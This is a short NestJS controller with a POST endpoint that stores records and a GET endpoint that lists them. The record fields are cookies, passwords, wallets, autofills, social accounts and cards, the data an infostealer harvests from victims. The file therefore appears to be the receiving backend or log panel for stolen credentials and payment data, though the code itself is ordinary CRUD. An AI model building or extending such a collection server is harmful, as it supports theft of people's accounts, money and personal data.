import { Body, Controller, Get, Post } from '@nestjs/common';
import { AppService } from './app.service';

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}

  @Post()
  create(@Body() dto: {
    id: number, 
    total: string,
    cookies: string, 
    passwords: string, 
    wallets: string,  
    autofills: string,
    social: string,
    cards: string,
    date: string
  }) {
      return this.appService.create(dto)
  }

  @Get()
    findMany() {
        return this.appService.findMany();
    }
}
